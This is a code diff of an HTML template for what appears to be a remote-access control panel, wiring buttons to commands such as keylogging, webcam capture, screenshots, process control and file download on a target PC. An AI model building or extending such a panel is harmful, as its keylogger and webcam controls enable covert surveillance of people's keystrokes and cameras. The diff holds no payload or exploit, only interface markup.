@@ -49,42 +49,41 @@
             </div>
 
             <div class="flex mb-2">
-                <button class="bg-green-500 rounded-sm p-2 text-white font-bold">LIST APPLICATIONS</button>
-                <button class="bg-green-500 rounded-sm p-2 ml-2 text-white font-bold">LIST PROCESSES</button>
-                <button class="bg-green-500 rounded-sm p-2 ml-2 text-white font-bold">SCREENSHOT</button>
-                <button class="bg-green-500 rounded-sm p-2 ml-2 text-white font-bold">PING</button>
+                <button id="listApplicationsButton" class="bg-green-500 rounded-sm p-2 text-white font-bold" data-ip="{{name}}" data-cmd="LIST APPLICATIONS">LIST APPLICATIONS</button>
+                <button id="listProcessesButton" class="bg-green-500 rounded-sm p-2 ml-2 text-white font-bold" data-ip="{{name}}" data-cmd="LIST PROCESSES">LIST PROCESSES</button>
+                <button id="screenshotButton" class="bg-green-500 rounded-sm p-2 ml-2 text-white font-bold" data-ip="{{name}}" data-cmd="SCREENSHOT">SCREENSHOT</button>
             </div>
 
             <div class="flex mb-2">
-                <button class="bg-orange-500 rounded-sm p-2 text-white font-bold">RESET PC</button>
-                <button class="bg-red-500 rounded-sm p-2 ml-2 text-white font-bold">SHUTDOWN PC</button>
+                <button class="bg-orange-500 rounded-sm p-2 text-white font-bold" data-ip="{{name}}" data-cmd="RESET PC">RESET PC</button>
+                <button class="bg-red-500 rounded-sm p-2 ml-2 text-white font-bold" data-ip="{{name}}" data-cmd="SHUTDOWN PC">SHUTDOWN PC</button>
             </div>
 
             <div class="flex mb-2">
-                <button class="bg-green-500 rounded-sm p-2 text-white font-bold">START KEYLOG</button>
-                <button class="bg-red-500 rounded-sm p-2 ml-2 text-white font-bold">STOP KEYLOG</button>
+                <button class="bg-green-500 rounded-sm p-2 text-white font-bold" data-ip="{{name}}" data-cmd="START KEYLOG">START KEYLOG</button>
+                <button class="bg-red-500 rounded-sm p-2 ml-2 text-white font-bold" data-ip="{{name}}" data-cmd="STOP KEYLOG">STOP KEYLOG</button>
             </div>
 
             <div class="flex mb-2">
-                <button class="bg-green-500 rounded-sm p-2 text-white font-bold">START WEBCAM</button>
-                <button class="bg-red-500 rounded-sm p-2 ml-2 text-white font-bold">STOP WEBCAM</button>
+                <button class="bg-green-500 rounded-sm p-2 text-white font-bold" data-ip="{{name}}" data-cmd="START WEBCAM">START WEBCAM</button>
+                <button class="bg-red-500 rounded-sm p-2 ml-2 text-white font-bold" data-ip="{{name}}" data-cmd="STOP WEBCAM">STOP WEBCAM</button>
             </div>
 
             <div class="flex mb-2">
                 <input type="text" class="text-black pl-2" placeholder="Enter application name..." />
-                <button class="bg-green-500 rounded-sm p-2 ml-2 text-white font-bold">START</button>
-                <button class="bg-red-500 rounded-sm p-2 ml-2 text-white font-bold">STOP</button>
+                <button class="bg-green-500 rounded-sm p-2 ml-2 text-white font-bold" data-ip="{{name}}" data-cmd="START APPLICATION">START</button>
+                <button class="bg-red-500 rounded-sm p-2 ml-2 text-white font-bold" data-ip="{{name}}" data-cmd="STOP APPLICATION">STOP</button>
             </div>
 
             <div class="flex mb-2">
                 <input type="text" class="text-black pl-2" placeholder="Enter process name..." />
-                <button class="bg-green-500 rounded-sm p-2 ml-2 text-white font-bold">START</button>
-                <button class="bg-red-500 rounded-sm p-2 ml-2 text-white font-bold">STOP</button>
+                <button class="bg-green-500 rounded-sm p-2 ml-2 text-white font-bold" data-ip="{{name}}" data-cmd="START PROCESS">START</button>
+                <button class="bg-red-500 rounded-sm p-2 ml-2 text-white font-bold" data-ip="{{name}}" data-cmd="STOP PROCESS">STOP</button>
             </div>
 
             <div class="flex mb-2">
                 <input type="text" class="text-black pl-2" placeholder="Enter FILE name..." />
-                <button class="bg-green-500 rounded-sm p-2 ml-2 text-white font-bold">DOWNLOAD</button>
+                <button class="bg-green-500 rounded-sm p-2 ml-2 text-white font-bold" data-ip="{{name}}" data-cmd="DOWNLOAD FILE">DOWNLOAD</button>
             </div>
         </div>
     </script>
